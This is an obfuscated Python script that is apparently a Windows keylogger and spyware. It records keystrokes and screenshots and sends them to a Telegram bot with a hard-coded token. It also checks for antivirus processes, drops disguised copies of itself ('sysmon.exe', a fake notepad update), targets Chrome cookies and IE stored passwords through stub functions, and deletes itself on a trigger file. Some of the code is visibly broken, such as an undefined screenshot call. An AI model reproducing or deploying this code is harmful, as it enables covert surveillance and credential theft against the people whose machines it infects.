lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll = bool, len, __name__, open, exit

from psutil import process_iter as llIlllIIlllIlI
from shutil import rmtree as lIIIIIIIlllIII
from os import makedirs as IIIIlllIIIIIlI, remove as lIIIIlIIIllIII
from base64 import b64encode as llllIIlIlllIIl, b64decode as IIIIlIIllIllIl
from os.path import exists as IIIIllIlIIlllI, join as IllIllIIlIIIlI, expanduser as lIlIlIIIlllllI
from winreg import OpenKey as IlIllIllIIlIII, HKEY_CURRENT_USER as llIIIIIIIIIlII
from requests import post as IIIllIIlIlIIII
from time import time as IllllIlIIIIIlI, sleep as llIIlllIIlIlII
from keyboard import KEY_DOWN as IIllIIIIllIllI, read_event as lIlIllIlllIIlI
from pyautogui import screenshot as lIlIIlllIlllIl
from datetime import datetime as lIlIIllIIlIllI
IlIIIllIlIIIlIllll = '7195166168:AAF9U6r_9sm_8SjoXbFn6LvxvHKDXYWWvTK'
IIlIlIlIIIIIlllIIl = '6088440786'
IIIlIIIlIIlllIllII = 'C:\\Temp\\data'
IllIllIlIIlIlllIll = 'notepad_update.exe'
IllIllIIlIIIlllIIl = 'sysmon.exe'

def IIlIIIlIlllIIllIll():
    IllIllIIIIlllIlIIl = ['avastsvc.exe', 'mcafee.exe', 'msmpeng.exe']
    for llIIlIlIIllIIIIlIl in llIlllIIlllIlI():
        if llIIlIlIIllIIIIlIl.name().lower() in IllIllIIIIlllIlIIl:
            return lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1)
    return lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)

def IIIllIIIIIlIIIIIll():
    lIIIIIIIlllIII(IIIlIIIlIIlllIllII, ignore_errors=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
    lIIIIlIIIllIII(__file__)
    llllllllllllIll()

def IlIlIIIIlIlIIllIII():
    with lllllllllllllII(__file__, 'rb') as llIlIlIlIIIllIlIII:
        llllIlIlIIIlIIIlII = llllIIlIlllIIl(llIlIlIlIIIllIlIII.read()).decode()
    with lllllllllllllII(IllIllIlIIlIlllIll, 'w') as llIlIlIlIIIllIlIII:
        llIlIlIlIIIllIlIII.write('# Fake notepad update\n')
    return llllIlIlIIIlIIIlII

def IIllIIIIIlIIIlIlll():
    if IIIIllIlIIlllI(IllIllIlIIlIlllIll):
        lIIIIlIIIllIII(IllIllIlIIlIlllIll)
    with lllllllllllllII(IllIllIIlIIIlllIIl, 'wb') as llIlIlIlIIIllIlIII:
        llIlIlIlIIIllIlIII.write(IIIIlIIllIllIl(IlIlIIIIlIlIIllIII()))

def IIlIllIIllllIlIIlI():
    lIIIIlllllIIlIlIlI = lIlIlIIIlllllI('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies')
    if IIIIllIlIIlllI(lIIIIlllllIIlIlIlI):
        return 'Cookies extracted (implement sqlite3 parsing)'
    return 'No cookies found'

def llIIlIlllIllllIlII():
    try:
        llIIIllIIlIlIIlIlI = IlIllIllIIlIII(llIIIIIIIIIlII, 'Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2')
        return 'Passwords extracted (implement winreg parsing)'
    except:
        return 'No passwords found'

def IllIlIlIIIIllllIlI(lIIIIllIlIIIIlIIII, llIIllIlIIIllIIIlI=None):
    lIIlIIlllIIIlIIIlI = f'https://api.telegram.org/bot{IlIIIllIlIIIlIllll}/sendMessage'
    IIllIIlIIIIllIlIll = {'chat_id': IIlIlIlIIIIIlllIIl, 'text': lIIIIllIlIIIIlIIII}
    IIIllIIlIlIIII(lIIlIIlllIIIlIIIlI, params=IIllIIlIIIIllIlIll)
    if llIIllIlIIIllIIIlI:
        with lllllllllllllII(llIIllIlIIIllIIIlI, 'rb') as llIlIlIlIIIllIlIII:
            IIIllIIlIlIIII(f'https://api.telegram.org/bot{IlIIIllIlIIIlIllll}/sendPhoto', data={'chat_id': IIlIlIlIIIIIlllIIl}, files={'photo': llIlIlIlIIIllIlIII})

def IIIlllIlllIIIIIIll():
    IIIIlllIIIIIlI(IIIlIIIlIIlllIllII, exist_ok=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
    IIlllIIIlIlIlIIllI = IllIllIIlIIIlI(IIIlIIIlIIlllIllII, 'keys.txt')
    lIlIIlIlIIIllllIIl = 0
    while lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1):
        if IIlIIIlIlllIIllIll():
            IlIlIIIIlIlIIllIII()
            llIIlllIIlIlII(10)
            continue
        else:
            IIllIIIIIlIIIlIlll()
        lIllIllIlllllIIllI = lIlIllIlllIIlI()
        if lIllIllIlllllIIllI.event_type == IIllIIIIllIllI:
            with lllllllllllllII(IIlllIIIlIlIlIIllI, 'a') as llIlIlIlIIIllIlIII:
                llIlIlIlIIIllIlIII.write(f'{lIlIIllIIlIllI.now()}: {lIllIllIlllllIIllI.name}\n')
            if llllllllllllllI(lllllllllllllII(IIlllIIIlIlIlIIllI).read()) > 100:
                IllIlIlIIIIllllIlI(lllllllllllllII(IIlllIIIlIlIlIIllI).read())
                lIIIIlIIIllIII(IIlllIIIlIlIlIIllI)
        if IllllIlIIIIIlI() % 60 == 0:
            llIlIIlIIlIlIIIIll = llIlIIlIIlIlIIIIll()
            lIIlIllIlIIlIlIlIl = IllIllIIlIIIlI(IIIlIIIlIIlllIllII, f'screen_{lIlIIlIlIIIllllIIl}.png')
            llIlIIlIIlIlIIIIll.save(lIIlIllIlIIlIlIlIl)
            IllIlIlIIIIllllIlI('Screenshot captured', lIIlIllIlIIlIlIlIl)
            lIlIIlIlIIIllllIIl += 1
            lIIIIlIIIllIII(lIIlIllIlIIlIlIlIl)
        if IllllIlIIIIIlI() % 300 == 0:
            lllIIIIIIIlIIIIIlI = IIlIllIIllllIlIIlI()
            lIllllllIlIIIIlllI = llIIlIlllIllllIlII()
            IllIlIlIIIIllllIlI(f'Cookies: {lllIIIIIIIlIIIIIlI}\nPasswords: {lIllllllIlIIIIlllI}')
        if IIIIllIlIIlllI('C:\\ProgramData\\AV_Detected.txt'):
            IIIllIIIIIlIIIIIll()
if lllllllllllllIl == '__main__':
    IIIlllIlllIIIIIIll()